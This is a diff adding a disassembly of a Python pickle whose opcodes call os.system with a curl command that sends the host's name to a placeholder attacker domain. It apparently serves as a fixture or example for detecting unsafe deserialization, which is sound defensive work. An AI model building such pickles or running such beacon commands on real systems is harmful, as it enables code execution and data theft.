@@ -1,0 +1,16 @@
+﻿0: \x80 PROTO      4
+2: \x95 FRAME      72
+11: \x8c SHORT_BINUNICODE 'os'
+15: \x94 MEMOIZE    (as 0)
+16: \x8c SHORT_BINUNICODE 'system'
+24: \x94 MEMOIZE    (as 1)
+25: \x93 STACK_GLOBAL
+26: \x94 MEMOIZE    (as 2)
+27: \x8c SHORT_BINUNICODE 'curl http://attacker.com/beacon?host=$(hostname)'
+77: \x94 MEMOIZE    (as 3)
+78: \x85 TUPLE1
+79: \x94 MEMOIZE    (as 4)
+80: R   REDUCE
+81: \x94 MEMOIZE    (as 5)
+82: .   STOP
+highest protocol among opcodes = 4
